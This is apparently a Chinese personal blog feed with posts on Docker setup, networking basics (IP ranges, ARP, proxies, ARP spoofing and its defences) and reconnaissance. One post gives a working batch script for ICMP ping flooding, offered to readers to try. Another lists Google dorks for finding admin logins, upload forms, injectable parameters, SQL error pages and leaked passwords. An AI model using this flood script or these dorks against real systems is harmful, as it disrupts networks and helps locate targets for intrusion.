title="1.改镜像"></a>1.改镜像</h2><p>首先</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">sudo vim /etc/docker/daemon.json<br></code></pre></td></tr></table></figure><p>  这个文件一般都没有但是这个目录一般都有没有就<code>sudo mkdir -p /etc/docker</code>     创建一个目录</p><p>然后在daemon.json写入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;registry-mirrors&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-string">&quot;https://hub.uuuadc.top&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;https://docker.anyhub.us.kg&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;https://dockerhub.jobcher.com&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;https://dockerhub.icu&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;https://docker.ckyl.me&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;https://docker.awsl9527.cn&quot;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>保存退出即可</p><p>最后，使 systemd 重新读取并应用所有的单元文件，[以确保最新的配置生效]并重启 Docker 服务。</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell">sudo systemctl daemon-reload<br>sudo systemctl restart docker<br></code></pre></td></tr></table></figure></blockquote><p>现在就会自动从镜像仓库下载 image 文件了</p><h2 id="2-抓取image文件并运行"><a href="#2-抓取image文件并运行" class="headerlink" title="2.抓取image文件并运行"></a>2.抓取image文件并运行</h2><p>首先，运行下面的命令，将 image 文件从仓库抓取到本地。</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker image pull library/hello-world</span><br></code></pre></td></tr></table></figure></blockquote><p>上面代码中，<code>docker image pull</code>是抓取 image 文件的命令。<code>library/hello-world</code>是 image 文件在仓库里面的位置，其中<code>library</code>是 image 文件所在的组，<code>hello-world</code>是 image 文件的名字。</p><p>由于 Docker 官方提供的 image 文件，都放在<code>library</code>组里面，所以它的是默认组，可以省略。因此，上面的命令可以写成下面这样。</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker image pull hello-world</span><br></code></pre></td></tr></table></figure></blockquote><p>抓取成功以后，就可以在本机看到这个 image 文件了。</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041102497.png" alt="屏幕截图 2024-08-03 153132"></p><p>现在，运行这个 image 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">docker run hello-world<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041103718.png" alt="屏幕截图 2024-08-03 153408"></p><p>成功！</p><p>还有有一种可以自动抓取 image 文件如果发现本地没有指定的 image 文件，就会从仓库自动抓取这样就不用先抓取再运行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">docker container run hello-world<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041100910.png" alt="img"></p><p>输出这段提示以后，<code>hello world</code>就会停止运行，容器自动终止。</p><p>有些容器不会自动终止，因为提供的是服务。比如，安装运行 Ubuntu 的 image，就可以在命令行体验 Ubuntu 系统。</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">docker container run -it ubuntu bash<br></code></pre></td></tr></table></figure></blockquote><p>对于那些不会自动终止的容器，使用<code>docker kill</code>或者是输入exit手动退出。</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">docker kill [containID]<br></code></pre></td></tr></table></figure></blockquote><p>注意：可以使用<code>docker ps</code>来查询containID</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041100328.png" alt="img"></p><p>​                                上图表示运行ubuntu bash并进行交互</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041100315.png" alt="img"></p><p>在上图中使用到了docker ps来查询列出所有当前正在运行的容器，并显示它们的容器ID、镜像、命令、创建时间、状态、端口和名称</p><p>并且使用了docker kill来退出docker的ubuntu系统</p><p>注意：在docker中运行docker是需要特殊配置的对于我目前来说不常用感兴趣的可以试着玩玩</p><p>​          上图表示使用ex<img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041104343.png" alt="屏幕截图 2024-08-03 160252">it退出docker中的ubuntu系统</p><p>删除容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">docker rm 5eedf2c63f7b<br></code></pre></td></tr></table></figure><h1 id="五、Docker可视化工具portainer的安装"><a href="#五、Docker可视化工具portainer的安装" class="headerlink" title="五、Docker可视化工具portainer的安装"></a>五、Docker可视化工具portainer的安装</h1><p>portainer：<a href="https://juejin.cn/post/7174298638758182925">https://juejin.cn/post/7174298638758182925</a></p><p>在虚拟机启动后可以使用虚拟机的ipv4地址来在主机进行访问 如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041104878.png" alt="屏幕截图 2024-08-03 171135">我在启动服务的时候开放的是9000端口所以直接访问192.168.10.132:9000即可（在主机或者虚拟机都可以访问)</p><p>这是在本地启动的服务（第一次登陆的时候需要先设置密码）</p><p>感觉比较好用</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041105271.png" alt="屏幕截图 2024-08-03 165449"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041100156.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041100204.png" alt="img"></p>]]></content>
    
    
    
    <tags>
      
      <tag>-Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息搜集的相关拓展(计网)</title>
    <link href="/2024/07/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%9A%84%E7%9B%B8%E5%85%B3%E6%8B%93%E5%B1%95/"/>
    <url>/2024/07/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%9A%84%E7%9B%B8%E5%85%B3%E6%8B%93%E5%B1%95/</url>
    
    <content type="html"><![CDATA[<h1 id="ip地址及公、私有ip和子网掩码"><a href="#ip地址及公、私有ip和子网掩码" class="headerlink" title="ip地址及公、私有ip和子网掩码"></a>ip地址及公、私有ip和子网掩码</h1><h2 id="私有IP："><a href="#私有IP：" class="headerlink" title="私有IP："></a>私有IP：</h2><ul><li>10.0.0.0 到 10.255.255.255</li><li>172.16.0.0 到 172.31.255.255</li><li>192.168.0.0 到 192.168.255.255</li></ul><p>如果不在以上的范围中则可能是一个共有ip</p><h2 id="为什么要分开私有ip和公有ip：（了解即可不必细究"><a href="#为什么要分开私有ip和公有ip：（了解即可不必细究" class="headerlink" title="为什么要分开私有ip和公有ip：（了解即可不必细究)"></a>为什么要分开私有ip和公有ip：（了解即可不必细究)</h2><p><strong>地址空间****管理</strong>：</p><ul><li>私有 IP 地址范围（如 192.168.x.x、10.x.x.x）专门为局域网设计，允许多个组织或个人在内部网络中使用相同的 IP 地址，而不会发生冲突。这样可以避免因为全球范围内的地址枯竭而导致 IP 地址不足。</li></ul><p><strong>安全性</strong>：</p><ul><li>私有 IP 地址仅在局域网内部可见和访问，不直接暴露在公共互联网上，从而提高了网络的安全性。公共互联网上的攻击者无法直接访问或扫描局域网中的私有 IP 设备。</li></ul><p><strong>网络隔离</strong>：</p><ul><li>通过使用 NAT（网络地址转换）技术，将私有 IP 地址映射到公有 IP 地址，可以有效隔离局域网和公共互联网。这种隔离有助于减少潜在的网络攻击面，并提高网络的安全性和稳定性。</li></ul><p><strong>地址冲突避免</strong>：</p><ul><li>私有 IP 地址在全球范围内是唯一的，不会与其他网络冲突。这使得不同组织或家庭可以在自己的网络中使用相同的 IP 地址范围，而不会互相干扰。</li></ul><p><strong>简化路由和管理</strong>：</p><ul><li>使用私有 IP 地址可以简化局域网内部的路由和管理。网络管理员可以更容易地控制和监视内部网络的流量和访问控制。</li></ul><p><strong>IP</strong> <strong>地址节约</strong>：</p><ul><li>由于私有 IP 地址不需注册和分配给每个设备，这种管理方式节约了全球 IP 地址资源。</li></ul><p>私有IP地址在局域网中使用，而公网IP地址用于在互联网中唯一标识设备</p><h2 id="ip分为网络号和主机号"><a href="#ip分为网络号和主机号" class="headerlink" title="ip分为网络号和主机号"></a>ip分为网络号和主机号</h2><p>通俗的来说网络号是为了区分不同的局域网 主机号是为了区分在同一局域网中的不同主机</p><h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>因为假如说：192.168.123.123这个私有ip他的网络号可以是第一个部分也可以是一、二 两个部分还有可能是一、二、三 仨部分 剩余的就是主机部分</p><p>而子网掩码的存在是为了区分哪部分是网络号哪部分是主机号甚至呢个够精准到某一位</p><p>具体的解释可以去看看视频【<a href="https://www.bilibili.com/video/BV1xu411f7UW/">IPv4地址和子网掩码</a>】</p><h1 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h1><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>arp协议就是把一个ip地址绑定到一个mac地址上方便发送信息给指定的计算机</p><p>（就是ARP协议用于解析IP地址到MAC地址的映射关系。）</p><p><strong>？</strong>至于在同一个局域网中为什么不能直接使用ip进行通信还要通过arp协来引入mac地址来进行通信的原因：</p><p>1.是因为计算机的网络通信遵循OSI模型：其中只要是计算机通信就要涉及到不同层次间的数据传输 </p><p>2.而以上的通信过程就涉及到数据链路层和网络层两个层次</p><p>当一个设备在局域网中发送数据时，数据包会经历以下几个步骤：</p><p>（1）<strong>应用层到****网络层</strong>：数据生成后，设备会在应用层和传输层中添加应用数据和传输数据（例如，HTTP数据和TCP&#x2F;UDP数据），接着在网络层添加IP头部信息，包括源IP地址和目标IP地址。</p><p>（2）<strong>网络层<strong><strong>到</strong></strong>数据链路层</strong>：数据包被传递到数据链路层，此时需要封装成帧。为了使帧在局域网内传输，设备需要知道目标设备的MAC地址。</p><p>当然：在同一个局域网内，确实可以直接使用MAC地址进行通信。但是仅限在同一个局域网中。详细了解建议去看计<a href="https://qcn19df42ger.feishu.cn/wiki/SOVgwPeLMilexAkJY5KcGvtOnAb">计算机网络基础.docx</a></p><p>嘿嘿嘿借用一下</p><p><strong>？</strong>那在我们去通过一个公网ip去访问一个服务器的时候arp是如何参与的？</p><p>（1）当你的设备试图访问公网上的一个 IP 地址时，它首先检查目标 IP 地址是否在同一子网内。如果是，它直接尝试与目标通信。</p><p>（2）如果目标 IP 地址不在同一子网内，你的设备会将数据包发送给默认网关（路由器），它将充当你的设备和公网之间的中间人。这个过程通常涉及到 ARP（地址解析协议）。</p><p>（3）你的设备会发送一个 ARP 请求，询问网关的 MAC 地址。一旦得到回复，你的设备就会把数据包发送到网关的 MAC 地址。网关收到数据包后，根据自身的路由表确定数据包的下一个跳（通常是 ISP 的路由器或互联网上的下一个跳），然后转发数据包。【其中的吓一跳通常是指数据包应该转发到的下一个路由器】</p><p>（4）最终到目标网关【其实我们所输入的公网ip其实就是网关的共有ip】</p><p>这种情况如果说是一个服务器对应一个网关还比较容易理解</p><p>但是如果多个服务器共用一个路由器网关的情况就需要一种路由器的机制</p><p><strong>端口****转发：</strong>端口转发是最常见的方法之一。路由器根据接收到的请求的目标端口号，将流量转发到内部网络中的特定服务器和端口</p><p><strong>网络地址转换<strong><strong>（</strong></strong>NAT****）：</strong>NAT可以让多个内部服务器共享一个公网IP地址。路由器维护一个NAT表，记录内部私有IP和端口号与外部公共IP和端口号的对应关系。当外部请求到达时，路由器会查找NAT表，确定将流量转发到哪台内部服务器。</p><p>负载均衡：负载均衡器可以将流量分配到多个后端服务器，以提高系统的性能和可用性。负载均衡器可以根据不同的算法（如轮询、最小连接数等）将请求分配给不同的服务器。</p><p><strong>反向代理****：</strong>反向代理服务器接收所有外部请求，然后根据请求的内容（例如URL路径、头信息等），将请求转发给适当的内部服务器。反向代理不仅可以分配流量，还可以缓存内容、提供SSL加密等服务。</p><p>反向代理服务器是把来自客户端的请求按目标分发不同的内部服务器</p><p>{</p><p>作用</p><ul><li><strong>负载均衡</strong>：分配请求到多台服务器，以均衡负载，提升性能和可靠性。</li><li><strong>安全性</strong>：隐藏内部服务器的真实IP地址，防止直接攻击，提高安全性。</li><li><strong>缓存</strong>：缓存静态内容，减少内部服务器负载，加快响应速度。</li><li><strong>SSL****终止</strong>：集中管理SSL证书，处理SSL加密解密，简化内部服务器的配置。</li><li><strong>内容分发</strong>：根据请求内容，将请求分发到不同的内部服务器或服务器组。</li></ul><p>}</p><p>正向代理是代理客户端可隐藏客户端的真实ip</p><p>{</p><p>作用</p><ul><li><strong>访问控制</strong>：控制客户端的访问权限，如限制访问特定网站。</li><li><strong>匿名访问</strong>：隐藏客户端的真实IP地址，保护隐私。</li><li><strong>缓存</strong>：缓存常访问的内容，提高访问速度，减少带宽使用。</li><li><strong>绕过限制</strong>：帮助客户端绕过网络限制或防火墙，访问受限资源。</li></ul><p>}</p><h3 id="APR欺骗"><a href="#APR欺骗" class="headerlink" title="APR欺骗"></a>APR欺骗</h3><p><strong>攻击步骤</strong></p><p><strong>扫描网络</strong>：攻击者首先扫描网络以获取 IP 地址和对应的 MAC 地址。</p><p><strong>发送伪造</strong> <strong>ARP</strong> <strong>响应</strong>：攻击者发送伪造的 ARP 响应消息，将自己的 MAC 地址冒充成网关或其他目标设备的 MAC 地址。</p><p><strong>接收数据包</strong>：受害者的设备更新其 ARP 缓存，将攻击者的 MAC 地址与目标 IP 地址关联。随后，数据包会被错误地发送到攻击者的设备。</p><p><strong>中间人攻击</strong>：攻击者可以选择窃听、修改数据包，或者将数据包转发给真正的目标设备，使得受害者不易察觉到攻击的存在。</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ol><li>数据窃取</li><li>数据篡改</li><li>服务中断</li></ol><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol><li><strong>静态 ARP 表</strong>：在网络设备上配置静态 ARP 表，防止 ARP 表被动态更新。</li><li><strong>ARP 监控工具</strong>：使用工具监控网络中的 ARP 流量，检测异常的 ARP 消息。</li><li><strong>加密通信</strong>：使用 HTTPS、SSH 等加密协议，防止中间人攻击窃取敏感信息。</li><li><strong>交换机安全功能</strong>：启用交换机的安全功能，如动态 ARP 检测（Dynamic ARP Inspection，DAI）和端口安全（Port Security），防止 ARP 欺骗攻击。</li><li><strong>VPN</strong>：使用虚拟专用网络（VPN）进行加密通信，保护数据传输的安全性。</li></ol><p>arp欺骗的正当的使用：在应急的时候可以用来快速切换设备</p><h1 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ping命令是比较常见的一个测试是否联通的命令 以下是这几天来我捣鼓的新知识。</p><h2 id="知识概括"><a href="#知识概括" class="headerlink" title="知识概括"></a>知识概括</h2><p>Ping [ip] 可测试本机对于一个ip是否可以联通</p><p>tracert [ip] 这个命令可以让你知道你所发送的数据包到底是在哪里出的问题导致不可达 </p><p>​                  可以追踪你的数据包所经过的每一个网络节点{每个跃点代表数据包从你的计算机到目标IP地址经过的一个网络设备。通常，这些设备可能是路由器、网关或其他网络节点。}</p><p>ping泛洪攻击（也叫ICMP泛洪攻击）中所需要注意到的点以及目前我所遇到的有那种情况会导致此类攻击不成功</p><h2 id="ping不通或请求超时的解决办法"><a href="#ping不通或请求超时的解决办法" class="headerlink" title="ping不通或请求超时的解决办法"></a>ping不通或请求超时的解决办法</h2><p>  可以先使用tracert追踪看看数据包访问目标所经过的路径看一下在哪个节点出现了请求超时的情况（tracert适用于windows  traceroute适用于linux macos系统而且相对tracert来说所支持的通信协议更多不只是有icmp还有udp等</p><p>至于在实际操作中具体使用哪个依据情况来确定）注意：ping 和 tracert 这两个命令是独立进行的</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221543058.png" alt="98ce8236-fee3-430f-93e2-3e3726415ad1"></p><p>上图是我使用tracert进行路由追踪的一个结果 在找无法ping通或请求超时的原因的时候不能只是去看是不是在tracert的结果中哪一个跃点请求超时 因为有的路由器或者防火墙之类的设备为了防止发现网络拓扑图会禁止这类的数据包进行响应 虽然在上图中的一些跃点请求超时但是在实际的去ping的时候仍然有可能ping通 所以我们在tracert之后可以再进行一个跃点一个跃点的去ping 这样可以找出问题到底出现在哪里 哪个ip；</p><h2 id="Ping泛洪攻击（ICMP泛洪攻击）"><a href="#Ping泛洪攻击（ICMP泛洪攻击）" class="headerlink" title="Ping泛洪攻击（ICMP泛洪攻击）"></a>Ping泛洪攻击（ICMP泛洪攻击）</h2><p>我在这次进行泛洪攻击的时候所进行的第一次尝试是直接在虚拟机上尝试的然后发现没啥影响</p><p>可能是我线程太少导致的   还有一个原因：</p><p>虚拟化平台防护：许多虚拟化平台（如VMware、Hyper-V等）内置了一些防护措施，能够识别并限制泛洪攻击，防止其影响虚拟机的正常运行。</p><p>然后我直接关掉了我哥电脑的防火墙直接拿他的电脑开整</p><p>ping 192.168.<em>.</em> -l 65500 -t（命令啥意思自己查） </p><p>结果如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221543580.png" alt="790f0486-a358-41fe-a3ec-6f7606feab88"></p><p>后面变平了是因为我停止了ping泛洪</p><p>我开的是20线程的会对笔记本的网络访问造成影响但是还达不到完全”断网”的效果可能是我的线程开的比较小的原因 </p><p>脚本放这里了大家感兴趣的可以拿着玩一玩（这是一个批处理脚本 把文件后缀改成 .bat即可 点击即可运行）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">@<span class="hljs-built_in">echo</span> off<br><span class="hljs-built_in">set</span> target_ip=填写目标ip<br><span class="hljs-built_in">set</span> packet_size=65500<br><span class="hljs-built_in">set</span> /a ping_count=写线程数<br><br>:ping_loop<br><span class="hljs-keyword">for</span> /L %%i <span class="hljs-keyword">in</span> (1,1,%ping_count%) <span class="hljs-keyword">do</span> (<br>    start ping %target_ip% -l %packet_size% -t<br>)<br>pause<br>goto ping_loop<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息搜集</title>
    <link href="/2024/07/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2024/07/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="一、查子域名及网站的相关的信息"><a href="#一、查子域名及网站的相关的信息" class="headerlink" title="一、查子域名及网站的相关的信息"></a>一、查子域名及网站的相关的信息</h2><p>有关域名的相关信息查询</p><p>1.<a href="https://ping.chinaz.com/chatgpt.com">站长工具ping判断是否拒绝CND</a></p><p>2.<a href="https://ip.tool.chinaz.com/">IP&#x2F;IPV6查询，服务器地址查询-站长工具</a>ip反查</p><p>3.<a href="https://who.is/">WHOIS 搜索网站相关的注册信息 - Who.is</a></p><p>4.<a href="https://icp.chinaz.com/">ICP备案查询_APP及小程序备案查询 - 站长工具</a></p><p>5.<a href="https://site.ip138.com/www.baid.com/">dns 子域名 备案 域名信息 备案</a></p><p>6.<a href="https://whois.cloud.tencent.com/domain?domain=chatgpt.com">域名注册信息查询 - 腾讯云</a></p><p>7.<a href="https://www.virustotal.com/gui/home/upload">VirusTotal</a></p><p>这是一个在线网站可以帮助用户检测恶意软件、病毒和其他安全威胁。它通过对文件、URL、IP地址等进行扫描和分析来提供安全性报告</p><p>在信息搜集的过程中我们主要是要使用这个工具有一个url或者ip的网络图其中这个域名的子域名还有相关备案信息、SSL、TLS证书，相关联文件，exe程序……</p><p>这个分析网站挺不错的</p><h2 id="二、Google语法"><a href="#二、Google语法" class="headerlink" title="二、Google语法"></a>二、Google语法</h2><h3 id="1-基础（不必理会）"><a href="#1-基础（不必理会）" class="headerlink" title="1.基础（不必理会）"></a>1.基础（不必理会）</h3><p>Google搜索引擎</p><p>Index of&#x2F;　　使用它可以直接进入网站首页下的所有文件和文件夹中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Index`` of/</span><br></code></pre></td></tr></table></figure><p>intext:　　将返回所有在网页正文部分包含关键词的网页</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">intext:<span class="hljs-string">&quot;Python 教程&quot;</span> site:<span class="hljs-string">``</span>cnblogs.com<br></code></pre></td></tr></table></figure><p>intitle:　　将返回所有网页标题中包含关键词的网页</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">intitle:<span class="hljs-string">&quot;Python 教程&quot;</span> site:<span class="hljs-string">``</span>cnblogs.com<br></code></pre></td></tr></table></figure><p>cache:　　搜索google里关于某些内容的缓存</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">cache</span>:<span class="hljs-string">``</span>www.csdn.net<br></code></pre></td></tr></table></figure><p>define:　　搜索某个词语的定义</p><figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs puppet"><span class="hljs-keyword">define</span>:<span class="hljs-section">API</span><br></code></pre></td></tr></table></figure><p>filetype:　　搜索指定的文件类型，如：.bak，.mdb，.inc等</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">filetype</span>:pdf site:``cnblogs.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><p>info:　　查找指定站点的一些基本信息</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">info:<span class="hljs-string">``</span>www.csdn.net<br></code></pre></td></tr></table></figure><p>inurl:　　URL中包含指定字符的网页</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">inur<span class="hljs-variable">l:java</span> site:``cnblogs.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><p>Link:　　搜索所有和指定站点做了链接的URL</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">link</span>:<span class="hljs-string">``</span>cnblogs.com<br></code></pre></td></tr></table></figure><p>site:　     搜索某个特定网站中的内容</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">site:<span class="hljs-string">``</span>cnblogs.com<span class="hljs-string">``</span> Python<br></code></pre></td></tr></table></figure><p>+　　把google可能忽略的字列如查询范围。</p><p>​    Python +教程</p><p>​    这个搜索指令会确保搜索结果中必须包含“教程”这个词</p><p>​    </p><p>​    </p><p>-　　作用： 排除包含指定词的结果。</p><p>​    例子：</p><p>​    新加坡 -旅游</p><p>​    这个搜索指令会返回与新加坡相关的结果，但排除包含“旅游”这个词的页       面。</p><p>​    </p><p>​    </p><p>~　　搜索包括同义词的结果  ~开发</p><p>​    这个搜索指令会返回包含“开发”及其同义词的结果，例如“编程”、“建设”       等</p><p>​    </p><p>​    </p><p>.　　单一字符通配符，匹配一个字符。</p><p>​    c.t</p><p>​    这个搜索指令会匹配包含“c.t”模式的词，例如“cat”、“cut”等。</p><p>​    </p><p>​    </p><p>*　 多字符通配符，匹配多个字符</p><p>​    开发*</p><p>​    这个搜索指令会匹配以“开发”开头的词或短语，例如“开发人员”、“开发工     具”、“开发环境”等</p><p>​    </p><p>​    </p><p>“”  精确查询，搜索完全匹配的短语</p><p>​    “Python 编程”</p><p>​    这个搜索指令会返回包含完全匹配“Python 编程”短语的页面，而不是单独    包含“Python”和“编程”的页面。</p><h3 id="2-重要（记忆）"><a href="#2-重要（记忆）" class="headerlink" title="2.重要（记忆）"></a>2.重要（记忆）</h3><h4 id="（1）搜索网站的管理后台："><a href="#（1）搜索网站的管理后台：" class="headerlink" title="（1）搜索网站的管理后台："></a>（1）搜索网站的管理后台：</h4><p>(没必要去搜索像以下类似百度的搜索网站搜了也是白搜)</p><p>在搜索框中输入：</p><p>site:baidu.com intext: 管理 | 后台 | 后台管 </p><p>理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账 </p><p>号 | login | system </p><p>（以上是用来搜索一个网站的正文中是否包含有关键字）</p><p>site:baidu.com inurl:login | admin | manage | manager | admin_login | system | backend</p><p>（以上是用来找在与这个顶级域名相关的且具有关键词的url）   </p><p>site:baidu.com intitle: 管理 | 后台 | 后台管 </p><p>理 | 登陆 | 登录 </p><p>（以上是用来找在标题中有关键字的网站）</p><h4 id="（2）寻找具有文件上传功能的页面（尝试实现文件上传漏洞）"><a href="#（2）寻找具有文件上传功能的页面（尝试实现文件上传漏洞）" class="headerlink" title="（2）寻找具有文件上传功能的页面（尝试实现文件上传漏洞）"></a>（2）寻找具有文件上传功能的页面（尝试实现文件上传漏洞）</h4><p>site:baidu.com inurl:file | upload</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221504164.png" alt="5f78430f-55e9-481b-88c4-61706a095c07"></p><h4 id="（3）寻找注入口"><a href="#（3）寻找注入口" class="headerlink" title="（3）寻找注入口"></a>（3）寻找注入口</h4><p>site:target.com inurl:php?id&#x3D; | inurl:asp?id&#x3D; | inurl:aspx?id&#x3D; </p><p>（在实际操作中也可以试一试其他的常用参数）</p><h4 id="（3）找目录可能包含敏感文件"><a href="#（3）找目录可能包含敏感文件" class="headerlink" title="（3）找目录可能包含敏感文件"></a>（3）找目录可能包含敏感文件</h4><p>site:baidu.com intitle:index of </p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221504971.png" alt="0dad4db1-69f2-4071-905e-31f7c9dd279f"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221505323.png" alt="53beee50-538a-4682-a5e5-b06256b20638"></p><p>该语法用于搜索页面标题中包含“index of”的页面，通常这些页面是公开的目录列表页面，可能包含敏感文件。</p><h4 id="（4）SQl报错信息"><a href="#（4）SQl报错信息" class="headerlink" title="（4）SQl报错信息"></a>（4）SQl报错信息</h4><p>site:baidu.com intext:”sql syntax near” | </p><p>intext:”syntax error has occurred” | </p><p>intext:” incorrect syntax near” | </p><p>intext:”unexpected end of SQL command” | </p><p>intext:”Warning: mysql_connect()” |</p><p>intext:”Warning: mysql_query()” | </p><p>intext:”Warning: pg_connect()” </p><p>查报错信息可能在报错信息中含有有关数据库结构还有版本的敏感信息</p><h4 id="（5）phpinfo"><a href="#（5）phpinfo" class="headerlink" title="（5）phpinfo"></a>（5）phpinfo</h4><p>site:baidu.com ext:php intitle:phpinfo </p><p>（一般的网页是禁用phpinfo的但是可以试一下）</p><h4 id="（6）社会工程学"><a href="#（6）社会工程学" class="headerlink" title="（6）社会工程学"></a>（6）社会工程学</h4><p>site:csdn.com intitle:密码</p><p>（该语法用于搜索包含账号、密码等敏感信息的页面，通常这些页面可能存在信息泄露问题）</p><h4 id="相关的搜索网站"><a href="#相关的搜索网站" class="headerlink" title="相关的搜索网站"></a>相关的搜索网站</h4><p><a href="https://www.cnblogs.com/T0nmap/p/6aba4eadedfaeec4986056826cb32721.html">https://www.cnblogs.com/T0nmap/p/6aba4eadedfaeec4986056826cb32721.html</a></p><p>（以上是一个含有几个重要的搜索引擎的网站建议看一下）</p><h3 id="3-搜索助手"><a href="#3-搜索助手" class="headerlink" title="3.搜索助手"></a>3.搜索助手</h3><p><a href="https://dorks.faisalahmed.me/">漏洞赏金助手</a></p><h2 id="三、查找真实ip"><a href="#三、查找真实ip" class="headerlink" title="三、查找真实ip"></a>三、查找真实ip</h2><h3 id="1-海外ping"><a href="#1-海外ping" class="headerlink" title="1.海外ping"></a>1.海外ping</h3><p>海外ping查询：<a 